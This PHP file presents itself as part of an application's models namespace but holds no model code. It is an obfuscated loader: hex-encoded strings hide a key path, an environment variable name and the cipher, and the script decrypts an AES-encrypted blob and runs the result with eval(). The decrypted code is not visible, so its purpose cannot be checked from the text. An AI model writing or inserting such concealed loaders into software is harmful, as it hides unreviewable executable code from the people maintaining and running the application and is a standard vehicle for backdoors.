<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Zo35r1t7Hol384j6IvLerg==');

$c=base64_decode(

'CkBK+RdmQN/R7KjUgGhW1FiHvMl8f2z3qYqlEslkL63TtoOifIohm4herTBnOu4jj0XBldB8LMs9' .
'wRW104uCOORDPsIaK2gpZKEFSdvgcJk58DY4wfTJ9WEjFbxBXjGXHkxuW2THaTZa74B/cYa02KPa' .
'TOb6JnBzcBBcS5hEg0lAB0n+/mmz1TaZS+Am62P0r/GebeNw149oClo2KBZjxmcFzojCXjqIFzXU' .
'HRVb2OjCKAxUQN2j7ioBJrCPYx9tRFhSKA+wA3hCETVeCBnYLKLc3SNYchx7bh+80dOYbx+HWnrj' .
'oynzTWlYO2KAUc491bpSTz9edMMjH46jPW6fBn4f0gS24LfujP8x1MpQWKeueYi6q59fz1BXLjIK' .
'2n7QypPG6TgnXUbSViLnNWdfqztWb67DkDgsgS2y/U1mvON7Ag8t0/kpG+I31K+nF+JPWQd/GhON' .
'X/jIe8qH8R2UjpmjZGWLPQVvdbRkEcIKUCQHR83ridDi8BD8xyYaMCiT6JBZdOsJdvX35lkhYiCr' .
'V4m9yUEH1edGXgCc24tWpgMOJmYM3NJ+vD31QdE+SMEHypFbo5xG6Fxpfg3bmnSBtFlvC9vRTTrL' .
't7NZiYdSJSWAY9O/YAlLs9c2ekHOA2YgDsVVIi6BAq7p9VlImIVmCRYXwiBNv2dji9YFhZon/tQf' .
'DKCtPsFLSHj+aKhAGX/tg03/LNXq/kcJwzyy+ssH3IL0X5HDHd9ExL0ijoHXtvEYfSjjM0UvoFvl' .
'2LADJrUwJkG4qkVWnrpSJJxhfm1IjRMvNZVQHd7IzTf7h9yMI12LFOpiKgyHvWaYwhLoca3EhUU+' .
'aMqilUnWKHwCUSSxYAGj+wEOXyR4FKcqlImzbEe9Y7qng6OacjKDQROtEjQbyCwmNt7yrcRc+mqb' .
'QsrCvQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

